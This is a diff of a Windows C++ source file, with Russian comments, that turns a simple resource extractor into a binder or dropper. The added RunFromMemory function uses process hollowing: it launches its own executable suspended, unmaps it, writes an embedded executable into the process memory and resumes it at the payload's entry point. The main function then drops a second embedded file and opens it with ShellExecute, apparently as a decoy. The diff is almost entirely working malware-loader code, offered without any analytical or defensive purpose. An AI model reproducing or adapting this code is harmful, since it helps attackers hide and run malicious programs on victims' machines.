@@ -1,17 +1,13 @@
-// Generated.cpp: определяет точку входа для консольного приложения.
+// Generated.cpp: определяет точку входа для приложения.
 //
 
 #include "stdafx.h"
-#include "resource.h"
-#include <Windows.h>
-#include <iostream>
+#include "Generated.h"
+#include <windows.h>
 #include <exception>
+#include <shellapi.h>
 
-template <typename T>
-void log(T mes)
-{
-	std::cout << mes << std::endl;
-}
+typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
 
 bool extract(DWORD numb, LPCWSTR name)
 {
@@ -32,36 +28,103 @@ bool extract(DWORD numb, LPCWSTR name)
 		CloseHandle(hFile);
 		FreeResource(mem_block);
 
+		//SHELLEXECUTEINFO ExecuteInfo;
+		//ExecuteInfo.lpFile = name;
+		//ExecuteInfo.lpParameters = L"OPEN";
+		//ExecuteInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+		//ExecuteInfo.nShow = SW_SHOWNORMAL;
+
+		//ShellExecuteEx(&ExecuteInfo);
+
+		ShellExecute(0, L"OPEN", name, NULL, NULL, SW_SHOWNORMAL);
+
 		return is_extracted;
 	}
 	catch (std::exception &e)
 	{
-		log(e.what());
+		/*log(e.what());*/
 	}
 	return false;
 }
 
-int main()
+void RunFromMemory(LPSTR szFilePath, LPVOID pFile)
 {
-	wchar_t buffer1[100], buffer2[100];
-	LPWSTR firstname, secondname;
+	PIMAGE_DOS_HEADER IDH;
+	PIMAGE_NT_HEADERS INH;
+	PIMAGE_SECTION_HEADER ISH;
+	PROCESS_INFORMATION PI;
+	STARTUPINFOA SI;
+	PCONTEXT CTX;
+	PDWORD dwImageBase;
+	NtUnmapViewOfSection xNtUnmapViewOfSection;
+	LPVOID pImageBase;
+	int Count;
 
+	IDH = PIMAGE_DOS_HEADER(pFile);
+	if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
+	{
+		INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
+		if (INH->Signature == IMAGE_NT_SIGNATURE)
+		{
+			RtlZeroMemory(&SI, sizeof(SI));
+			RtlZeroMemory(&PI, sizeof(PI));
 
-	int res = LoadString(NULL, 2001, buffer1, sizeof(buffer1));
-	firstname = buffer1;
+			if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
+			{
+				CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
+				CTX->ContextFlags = CONTEXT_FULL;
+				if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
+				{
+					ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
 
-	res = LoadString(NULL, 2002, buffer2, sizeof(buffer2));
-	secondname = buffer2;
+					if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
+					{
+						xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
+						xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
+					}
 
-	log(firstname);
-	log(secondname);
+					pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+					if (pImageBase)
+					{
+						WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
+						for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
+						{
+							ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
+							WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
+						}
+						WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
+						CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
+						SetThreadContext(PI.hThread, LPCONTEXT(CTX));
+						ResumeThread(PI.hThread);
+					}
+				}
+			}
+		}
+	}
+	VirtualFree(pFile, 0, MEM_RELEASE);
+}
 
-	if (extract(1001, firstname))
-		log("Success first");
-	if (extract(1002, secondname))
-		log("Success second");
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
+{
+	TCHAR szFilePath[1024];
+	wchar_t buffer[100];
+	LPWSTR firstname;
 
-	system("pause");
+	/*	Вложенный файл	*/
+	GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
+	//Получаем дескриптор ресурса
+	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(1002), RT_RCDATA);
+	//Загружаем в глобальную память
+	HGLOBAL mem_block = LoadResource(NULL, hRes);
+	//Запускаем второй файл из памяти
+	RunFromMemory(LPSTR(szFilePath), mem_block);
+
+	/*	Основной файл	*/
+
+	//Имя первого файла
+	int res = LoadString(NULL, 2001, buffer, sizeof(buffer));
+	firstname = buffer;
+	extract(1001, firstname);
 
 	return 0;
 }
